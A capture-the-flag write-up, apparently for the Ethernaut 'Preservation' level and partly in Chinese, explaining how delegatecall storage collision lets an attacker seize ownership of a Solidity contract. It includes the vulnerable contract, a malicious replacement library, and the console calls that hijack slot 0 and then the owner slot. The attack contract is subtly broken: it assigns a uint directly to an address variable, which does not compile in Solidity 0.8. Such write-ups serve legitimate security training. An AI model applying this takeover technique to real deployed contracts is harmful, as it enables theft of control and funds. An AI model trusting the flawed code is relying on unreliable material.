# **Level 16 -- Preservation**
## **Contract to hack**
``` ts
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
`````` 
---
## ***Objectives***
* get the owner of the `preservation` contract
---
## ***Thought Process***
首先观察`preservation`合约,其中的数据存储结构总共占用了4个slot
``` solidity
    address public timeZone1Library;  // slot 0
    address public timeZone2Library;    // slot 1
    address public owner;               // slot 2
    uint storedTime;                    // slot 3
```
在构造函数中初始化了两个`timeZoneLibrary`的地址和owner, 此外还有两个方法`setFirstTime`和`setSecondTime`, 都是用了delegatecall去调用`LibraryContract`名为`setTime`的方法.

在`LibraryContract`中仅有`storedTime`一个参数，占用了slot 0.

`delegatecall`是一种低级函数调用，当合约A用`delegatecall`调用合约B的方法时，表示允许合约B修改A的对应存储，因此当调用`LibraryContract`中`setTime`时，B修改了A中的slot0，也就是`timeZone1Library`

综上所述，我们可以写一个修改了内容`setTime`恶意合约，把合约地址存储到slot0中，再调用`setFirstTime`调用恶意合约修改掉owner。


---
## ***Solution***
1.写一个恶意合约 然后部署
``` ts
contract Preservation {

  // public library contracts
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
 
  // set the time for timezone 1
  function setTime(uint _timeStamp) public {
        owner = _timeStamp;
  }

}
```
2. > await contract.setSecondTime(contractAddress)
3. > await contract.setFirstTime(owner.address)



